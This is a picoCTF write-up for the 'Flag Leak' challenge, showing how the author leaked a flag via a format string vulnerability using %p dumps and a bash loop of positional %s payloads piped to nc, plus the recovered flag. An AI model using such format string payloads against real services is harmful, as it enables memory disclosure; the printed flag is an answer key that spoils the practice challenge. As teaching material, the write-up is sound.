# Flag Leak 

## Challenge
*Story telling class 1/2*
*I'm just copying and pasting with this program. What can go wrong? You can view source here. And connect with it using:*
*nc saturn.picoctf.net 50926* 

## Thought Process
First Step was to examine the files provided starting off with the vuln.c
After examining it was pretty clear that the program contained a format string vulnerability.

To exploit a format string vulnerability, I gave `%p%p%p%p%p%p%p%p%p%p%p%p` as an input to which i got a hex encoded - scrambled flag like response :
```bash
randoduck@DESKTOP-2PM3SNS:~$ nc saturn.picoctf.net 50926
Tell me a story and then I'll tell you one >> %p%p%p%p%p%p%p%p%p%p%p%p
Here's a story -
0xffcbc2200xffcbc2400x80493460x702570250x702570250x702570250x702570250x702570250x70257025 # *ocip{FTCk43L_gn1g4lFff0_4tS_1_kc2a125}* 
```
Since this isn't quite it , I tried using `gdb` to set return and break addresses to find out the location of *readflag* on the stack. This attempt of mine was unsuccessful as it kept showing errors regarding the file executables. After further research I came across this method of brute forcing and leaking values off the stack using different type of format strings . Now the way the brute forcing would work is by printing out the values in consecutive memory location in a stack . This repeated execution can be replicated using `for loop ` in bash .

#### Explanation of Each Component:

- **for i in {0..999}**
This is a Bash loop that iterates through numbers from 0 to 999.
The variable i takes each value in this range during each iteration.

- **do ... done:**
This defines the block of code to execute during each iteration of the loop.

- **echo "%$i\$s":**
echo: Prints the string to the terminal or pipes it to the next command.

- **"%$i\$s":**
%$i\$s:
%: A format specifier .
$i: The current value of i in the loop, replaced on each iteration.
\$: The \ escapes the dollar sign $ so it is treated as a literal character in the string.
s: part of a formatted string, intended for a format string vulnerability.

```bash
randoduck@DESKTOP-2PM3SNS:~$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 59213 ; done                                               
Tell me a story and then I'll tell you one >> Here's a story -                                                                                       %0$s                                                                                                                                                 Tell me a story and then I'll tell you one >> Here's a story -                                                                                       %1$s                                                                                                                                                 Tell me a story and then I'll tell you one >> Here's a story -                                                                                       A                                                                                                                                                   Tell me a story and then I'll tell you one >> Here's a story
picoCTF{L34k1ng_Fl4g_0ff_St4ck_ 
```
After several in the end we come across what uncannily ressembles a flag so we stop the process and take a look . I noticed that this particular flag was correct but nevertheless not complete.

## Solution 
 I realised this demanded a more targeted approach and hence used the `grep` command in my next iteration . The changes made were :
- **grep:** used to search for patterns in text.
It reads input (from a file or standard input) and outputs lines that match the specified pattern.
- **E:** Enables Extended Regular Expressions (ERE) in the pattern.
With -E, you can use additional regex features like parentheses () for grouping and | for alternation without needing to escape them.
- **i:**
Makes the search case-insensitive.
For example, it treats "PICO", "pico", "CtF", "CTF", etc., as equivalent matches.
- **'(pico|ctf)':**
pico: Matches any occurrence of "pico" (case-insensitively).
|: Means "OR" in regex.
ctf: Matches any occurrence of "ctf" (case-insensitively).

```bash 
randoduck@DESKTOP-2PM3SNS:~$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 59213 | grep -Ei '(pico|ctf)'; done                                                                                                                                            CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}     
```
piecing it up we get the flag as : *picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}*

## <3